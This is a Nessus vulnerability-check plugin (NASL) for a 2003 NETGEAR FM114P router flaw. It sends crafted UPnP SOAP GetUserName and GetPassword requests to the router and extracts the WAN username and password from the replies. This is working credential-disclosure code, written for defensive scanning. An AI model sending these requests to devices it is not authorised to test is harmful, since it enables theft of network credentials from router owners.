#
# (C) Tenable Network Security, Inc.
#

# Ref:
#
# From: Bj�rn Stickler <stickler@rbg.informatik.tu-darmstadt.de>
# To: <bugtraq@securityfocus.com>
# Subject: Another security problem in Netgear FM114P ProSafe Wireless Router firmware
# Date: Wed, 2 Apr 2003 19:58:57 +0200
#
# Special thanks to Bj�rn for having been kind enough to send me the following
# sample replies :
#
# HTTP/1.0 200 OK
# Connection:  close
# Server: UPnP/1.0 UPnP-Device-Host/1.0
# Content-length: 361
# Content-Type: text/xml; charset="utf-8"
#
# <?xml version="1.0"?>
# <SOAP-ENV:Envelope
# xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
# SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV
# :Body><m:GetUserNameResponse
# xmlns:m="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewUserName>xxxx<
# /NewUserName></m:GetUserNameResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
#
# And
# HTTP/1.0 200 OK
# Connection:  close
# Server: UPnP/1.0 UPnP-Device-Host/1.0
# Content-length: 365
# Content-Type: text/xml; charset="utf-8"
#
# <?xml version="1.0"?>
# <SOAP-ENV:Envelope
# xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
# SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV
# :Body><m:GetPasswordResponse
# xmlns:m="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewPassword>xxxx<
# /NewPassword></m:GetPasswordResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
#

include( 'compat.inc' );

if(description)
{
  script_id(11514);
  script_version ("$Revision: 1.11 $");
  script_bugtraq_id(7267, 7270);
  script_xref(name:"OSVDB", value:"57597");
  script_xref(name:"OSVDB", value:"57598");

  script_name(english:"NETGEAR FM114P ProSafe Router Multiple Vulnerabilities");
  script_summary(english:"Enumerates user and password via soap");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is subject to an information disclosure flaw.'
  );

  script_set_attribute(
    attribute:'description',
    value:"The NETGEAR FM114P ProSafe Wireless Router (and possibly other devices)
discloses the username and password of the WAN when it receives specially
crafted UPnP soap requests.

An attacker may use this flaw to steal a valid username and password.

In additition to this, an attacker may use UPnP to disable the firewall
rules of that device, thus bypassing the security policy that has been
set."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Reconfigure the device to disable remote management or UPnP."
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://archives.neohapsis.com/archives/bugtraq/2003-04/0042.html'
  );

    script_set_attribute(
    attribute:'see_also',
    value:'http://archives.neohapsis.com/archives/bugtraq/2003-04/0053.html'
  );
  
  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P'
  );

  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
  script_family(english:"Misc.");
  script_dependencie("find_service1.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

content = '<?xml version="1.0" encoding="utf-8"?>\r\n' +
'<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">\r\n' +
'   <s:Body>\r\n' +
'     <u:CHANGEME xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1" />\r\n' +
'   </s:Body>\r\n' +
'</s:Envelope>';


req = string("POST /upnp/service/WANPPPConnection HTTP/1.1\r\n",
"Host: ", get_host_name(), "\r\n",
'SoapAction: "urns:schemas-upnp-org:service:WANPPPConnection:1#CHANGEME"\r\n',
'Content-Type: text/xml ; charset="utf-8"\r\n',
'Content-Length: ', strlen(content), '\r\n\r\n',
content);

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);


banner = get_http_banner(port:port);
if ( ! banner || "Server: UPnP" >!< banner ) exit(0);




req1 = ereg_replace(string:req, pattern:"CHANGEME", replace:"GetUserName");
req2 = ereg_replace(string:req, pattern:"CHANGEME", replace:"GetPassword");

res = http_keepalive_send_recv(port:port, data:req1, embedded:TRUE);
if(res == NULL) exit(0);

if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res))
{
  username = egrep(pattern:"<NewUserName>", string:res);
  if(username)
  {
    user = ereg_replace(pattern:".*<NewUserName>(.*)</NewUserName>.*", string:username, replace:"\1");

  }
}


res = http_keepalive_send_recv(port:port, data:req2, embedded:TRUE);
if(res == NULL) exit(0);

if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res))
{
  password= egrep(pattern:"<NewPassword>", string:res);
  if(password)
  {
    pass = ereg_replace(pattern:".*<NewPassword>(.*)</NewPassword>.*", string:password, replace:"\1");
  }
}


if(username && password)
{
  report =
"It is possible to retrieve the remote WAN connection username and password
from the remote router, by sending specific upnp requests.

We could determine that the remote username/password pair is " + username + "/" + password + "

Solution : Disable upnp or remote management on this device
Risk factor : High";

   security_hole(port:port, data:report);
}



